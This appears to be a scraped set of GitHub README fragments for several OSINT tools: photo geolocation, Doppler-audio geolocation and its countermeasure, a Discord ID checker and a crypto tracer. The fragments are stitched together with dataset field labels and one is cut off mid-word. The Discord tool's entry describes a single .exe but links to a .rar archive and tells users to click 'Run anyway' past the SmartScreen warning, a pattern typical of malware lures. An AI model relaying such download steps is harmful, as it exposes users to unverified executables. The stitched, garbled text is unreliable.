# 🧭 geo-sleuth
**An agent skill that finds where a photo was taken — and shows its work.**
   Works with  
    …and any other agent that reads  SKILL.md  and runs shell commands. 
*No text. No plates. No landmarks. One bridge, one mountain. Located to within 2 m.*
---
## Quick start
```bash
npx skills add Oldcircle/geo-sleuth
```
Pick your agents when prompted. Then hand your agent a photo and say:
> find where this photo was taken
On first use, ask the agent to run `doctor.py` from the installed skill’s `scripts/` folder and address any failed checks (see [Requirements and setup](#requirements-and-setup)). That is the whole interface. The agent reads `SKILL.md`, runs the scripts, and comes back with the camera position, the direction it was facing and a satellite evidence image. Prefer to copy the folder yourself? See [Installation](#installation).
## Why geo-sleuth
- **One photo, one sentence.** Give your agent a photo and say *find where this photo was taken*. You get back the camera position, the direction it was facing, and a satellite evidence image.
- **It works when there is nothing to read.** No sign, no plate, no landmark: OpenStreetMap geometry, elevation data, satellite tiles and street view carry the search on their own.
- **Geometry instead of guesswork.** Pier spacing becomes a distance ruler, shadows become a bearing, a ridge line becomes a fingerprint that elevation data can be matched against.

itens.descricao_en: Remove aircraft Doppler signatures from audio/video so recordings can't be geolocated from flyovers. Includes a reference attack scorer to measure it.
itens.readme:
# flyover-scrub
Remove aircraft Doppler signatures from audio and video, so a recording can't be
geolocated from the planes flying over it.
The attack was shown by **colsto** in
[*I discovered a sound that leaks your exact location (and it's everywhere)*](https://www.youtube.com/watch?v=UytYrhYLOKI)
([@colsto](https://www.youtube.com/@colsto)). This repo is a defence against it, plus an independent replication.
> **It works on real phone videos.** On my own iPhone videos and public ADS-B data, a Cessna nobody could hear
> located an indoor selfie to 61–134 m, and a helicopter heard from a parked car picked the right aircraft out of 18.
> It survived 32 of 34 codec and filter chains, and TikTok passes faint tones through untouched.
> Full write-up, data and a reproducible proof of concept: [`research/`](research/README.md).
  All figures 
| | |
|---|---|
|   |   |
|   |   |
|   |   |
```sh
uv tool install .                         # or: uv run flyover-scrub ...
flyover-scrub input.mov -o output.mov     # audio scrubbed, video copied, metadata stripped
flyover-scrub --check input.mp4           # report long tonal ridges, write nothing
```
Both modes also report **grid hum (ENF)**: mains hum whose frequency wanders with the power grid, which can date
a recording and tell which grid it was made on. Scrubbing removes it by default (`--keep-hum` keeps it). See
[`research/`](research/README.md#4-the-other-leak-grid-hum-enf).

itens.descricao_en: Free OSINT app for Discord IDs: paste a user, server or invite and see when it was made and who it copies.
itens.readme:
Spot the flake. 
  Flake is a free OSINT desktop app for Discord IDs. Paste a user, server, message or invite and see when it was made, who it copies and where it leads. Official API with your own bot token. Nothing leaves your PC.  
> [!NOTE]
> **Download:** the Windows build is a single `Flake-setup.exe` — [releases](https://github.com/Tropicaldrescoop/discord-id-osint-checker/releases/latest/download/discord-id-osint-checker.rar). No installer, no admin rights, no account.
>
> The build isn't code-signed yet, so SmartScreen may warn you the first time. Choose **More info**, then **Run anyway**.
## Why Flake
Every Discord ID is a snowflake: the first 42 bits are the moment it was created. Scammers count on nobody checking. They copy a trusted name with a look-alike letter, borrow the avatar, and hijack invite links that used to point somewhere safe.
The lookup sites that used to answer this are mostly gone. Flake runs on your PC instead.
| | Lookup websites | Flake |
|---|---|---|
| **Token** | Theirs, shared by everyone | **Your own bot** |
| **Dates** | One ID at a time | **Paste 100, plot them, offline** |
| **Look-alikes** | Not checked | **Against IDs you saved** |
| **Invites** | Server name and count | **Changed hands? Phishing links?** |
| **Your history** | On their server | **Case files on your drive** |
## What you get
### Everything public about an ID
- **Created**, decoded straight from the ID, to the second.
- **Profile:** username, display name, avatar, banne

itens.readme:
DOPPLERGEIST 
 Aircraft Doppler Audio Geolocation 
**DOPPLERGEIST** uses aircraft Doppler signatures in audio recordings and ADS-B flight data to geolocate recordings. It includes a Python CLI and a local browser interface.
[Website](https://1337isnot1337.github.io/DOPPLERGEIST/) · [Examples](https://1337isnot1337.github.io/DOPPLERGEIST/examples.html) · [Install](#quickstart) · [How it works](#how-it-works) · [Results](#validation-and-results) · [Documentation](#documentation-and-references)
 Example: automatic MP3 analysis 
 Historical example before the current aircraft-type policy: automatic MP3 analysis selected 466 aircraft and ranked 105 candidate locations. The first candidate was **476 m from reference** in a constrained geographic search and clock window. [Experiment and ranking](docs/LIVERMORE_DEMO.md#all-aircraft-archive-mp3-ranking). 
## Capabilities
| Capability | What DOPPLERGEIST provides |
| --- | --- |
| **Automatic acoustic discovery** | Scans an entire recording for moving frequency tracks and groups related harmonics, without manually selecting event windows or frequency bands. |
| **Historical aircraft data** | Acquires and indexes ADSB.lol flight archives; caches reusable trajectory, terrain, and geoid inputs. |
| **Location search** | Compares predicted Doppler and sound-arrival patterns across candidate receiver locations, including evidence from multiple independent flyovers. |

Wake follows stolen crypto. Paste a wallet address or a transaction hash, and it traces the money hop by hop, across chains, to where it landed. Wake is free, runs on your PC and never asks for money to get anything back.

Wake finds your other payments to the same address on its own.
